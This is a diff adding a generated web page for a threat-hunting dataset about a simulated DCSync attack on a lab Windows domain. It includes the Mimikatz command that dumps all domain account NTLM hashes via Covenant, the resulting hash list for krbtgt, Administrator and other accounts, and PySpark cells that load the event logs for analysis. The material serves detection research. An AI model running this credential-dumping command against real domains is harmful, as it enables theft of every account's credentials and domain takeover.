@@ -1,0 +1,242 @@
+---
+redirect_from:
+  - "/notebooks/small/windows/06-credential-access/sd-191027064128"
+interact_link: content/notebooks/small/windows/06_credential_access/SD-191027064128.ipynb
+kernel_name: 
+kernel_path: content/notebooks/small/windows/06_credential_access
+has_widgets: false
+title: |-
+  Covenant DCSync All
+pagenum: 40
+prev_page:
+  url: /notebooks/small/windows/06_credential_access/SD-190625133822.html
+next_page:
+  url: /notebooks/small/windows/06_credential_access/SD-191205043030.html
+suffix: .ipynb
+search: com shire mordor mimikatz domain dataset dc covenant dcsync simulation gentilkiwi windows sharpsploit master lsadump csv benjamin vincent hfdc file metadata id sd author roberto rodriguez cybrwardg creation date platform environment type c tool script github cobbr blob credentials cs raw githubusercontent hunters forge datasets small credentialaccess covenantdcsyncall tar gz description represents adversaries abusing active directory replication services retrieve ntlm hashes accounts adversary view commands command x oct la vie lamour oe eo delpy blog v le toux letoux gmail pingcastle mysmartlogon powershell server exporting sysmonsvc bedeaeaddecdfe beacfdbafaafae wecserver deabeecdfc lrodriguez edfdefebfbebaefbbdad nmartha eceadfdfcfdb aaaabcddbcdeff daeccbcfec acct bbfbdddbdd hr faefeafdcbfd
+
+comment: "***PROGRAMMATICALLY GENERATED, DO NOT EDIT. SEE ORIGINAL FILES IN /content***"
+---
+
+    <main class="jupyter-page">
+    <div id="page-info"><div id="page-title">Covenant DCSync All</div>
+</div>
+    <div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Metadata">Metadata<a class="anchor-link" href="#Metadata"> </a></h2>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<table>
+<thead><tr>
+<th style="text-align:left"></th>
+<th style="text-align:left"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">id</td>
+<td style="text-align:left">SD-191027064128</td>
+</tr>
+<tr>
+<td style="text-align:left">author</td>
+<td style="text-align:left">Roberto Rodriguez @Cyb3rWard0g</td>
+</tr>
+<tr>
+<td style="text-align:left">creation date</td>
+<td style="text-align:left">2019/10/27</td>
+</tr>
+<tr>
+<td style="text-align:left">platform</td>
+<td style="text-align:left">Windows</td>
+</tr>
+<tr>
+<td style="text-align:left">Mordor Environment</td>
+<td style="text-align:left">shire</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Type</td>
+<td style="text-align:left">C2</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Tool</td>
+<td style="text-align:left">Covenant</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Script</td>
+<td style="text-align:left"><a href="https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Mimikatz.cs">https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Mimikatz.cs</a></td>
+</tr>
+<tr>
+<td style="text-align:left">Mordor Dataset</td>
+<td style="text-align:left"><a href="https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/covenant_dcsync_all.tar.gz">https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/covenant_dcsync_all.tar.gz</a></td>
+</tr>
+</tbody>
+</table>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Dataset-Description">Dataset Description<a class="anchor-link" href="#Dataset-Description"> </a></h2><p>This dataset represents adversaries abusing Active Directory Replication services to retrieve NTLM hashes from all domain accounts</p>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Adversary-View">Adversary View<a class="anchor-link" href="#Adversary-View"> </a></h2>
+<pre><code>Covenant Commands
+
+Mimikatz /command:"\"lsadump::dcsync /domain:shire.com /all /csv\""
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Oct  8 2019 14:30:39
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # lsadump::dcsync /domain:shire.com /all /csv
+[DC] 'shire.com' will be the domain
+[DC] 'HFDC01.shire.com' will be the DC server
+[DC] Exporting domain 'shire.com'
+1114    sysmonsvc   99264710bedea2ea17362d6d3ec3df1e
+1008    HFDC01$ 66665b82e8a05cfd0b3afa20822a6fae
+1116    WECSERVER$  304deabe963ec32d155f10057921c459
+1113    lrodriguez  edfd5efe1b4f98b0ebaef62bb5dad721
+1111    nmartha 5e51c1e48ad3f6d441359fcfd813204b
+1120    FILE001$    aaa1ab5c0d3db11c489d351983e776ff
+1117    IT001$  07da73e54ccb4cf559737e184520487c
+1118    ACCT001$    b2707b48f51bd28dd6525b2d496d7029
+1119    HR001$  09115fa4efe7112a61fd4221cb503fd0
+1112    pgustavo    81d310fa34e6a56a31145445891bb7b8
+502 krbtgt  6a3bc2eaa40be0ed9edabc0473528fd2
+500 Administrator   c3465384d3ca169d20fd28783e8d3914</code></pre>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Explore-Mordor-Dataset">Explore Mordor Dataset<a class="anchor-link" href="#Explore-Mordor-Dataset"> </a></h2>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Initialize-Analytics-Engine">Initialize Analytics Engine<a class="anchor-link" href="#Initialize-Analytics-Engine"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">openhunt.mordorutils</span> <span class="k">import</span> <span class="o">*</span>
+<span class="n">spark</span> <span class="o">=</span> <span class="n">get_spark</span><span class="p">()</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Download-&amp;-Process-Mordor-File">Download &amp; Process Mordor File<a class="anchor-link" href="#Download-&amp;-Process-Mordor-File"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/covenant_dcsync_all.tar.gz&quot;</span>
+<span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Get-to-know-your-data">Get to know your data<a class="anchor-link" href="#Get-to-know-your-data"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
+            <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">SELECT channel, COUNT(1)</span>
+<span class="sd">FROM mordorTable</span>
+<span class="sd">GROUPBY channel</span>
+<span class="sd">            &#39;&#39;&#39;</span><span class="p">)</span>
+<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
+        
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+ 
+
+
+    </main>
+    
